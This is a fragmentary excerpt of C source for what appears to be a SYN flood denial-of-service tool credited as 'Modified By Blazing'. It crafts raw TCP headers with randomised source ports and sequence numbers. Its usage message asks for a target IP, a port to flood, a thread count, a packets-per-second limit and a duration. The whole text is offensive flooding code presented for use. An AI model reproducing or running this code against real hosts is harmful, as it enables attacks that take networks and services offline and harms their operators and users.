...
{
	tcph->source = htons(50000 + rand_cmwc() % 65535);
	tcph->seq = rand();
	tcph->ack_seq = 1;
	tcph->res2 = 1;
	tcph->doff = 5;
...
int main(int argc, char *argv[ ])
{
 ...
 fprintf(stderr, "\e[1;92m	 Modified By Blazing\n");
	fprintf(stdout, "\e[1;91m Usage: %s <target IP> <port to be flooded> <number threads to use(5-20 is good enough)> <pps limiter, -1 for no limit> <time> \n", argv[0]);
	exit(-1);
	}
floodport = atoi(argv[2]);
	...
	fprintf(stderr, "New Thread | SYN Seq=0 Win=63315 Len=49\n", win);
	}
